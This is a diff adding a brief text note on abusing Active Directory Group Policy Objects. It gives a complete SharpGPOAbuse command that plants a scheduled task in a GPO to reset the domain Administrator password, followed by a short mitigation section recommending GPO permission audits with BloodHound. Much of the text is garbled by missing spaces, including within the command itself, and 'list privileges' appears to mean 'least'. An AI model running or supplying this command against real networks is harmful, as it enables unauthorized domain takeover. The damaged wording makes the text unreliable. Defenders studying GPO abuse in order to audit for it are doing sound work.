@@ -1,0 +1,14 @@
+AbusingVulnerableGPO.txt
+
+Group Policies are part of every ActiveDirectory. 
+GP is designed to be able tochange every system’s configurations, from list to most privileged layer. 
+Since it is so fundamental in the network managementprocess, it is also very powerful for attackers to use as an attack vector.
+
+Tools:
+1.
+.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net userAdministrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
+
+Solutions:
+Attackers use mapping network mappingtechniques as the first step of their attack, but this same technique can be also used formitigation. 
+You must know and reassess whohas access to your GPOs. Using free tools,such as BloodHound, can help you understandwho has access to a GPO and who inherits andaccess. 
+It will help you spot potential lateralmovement paths and reevaluate if yourcurrent state is answering a “list privileges” method.
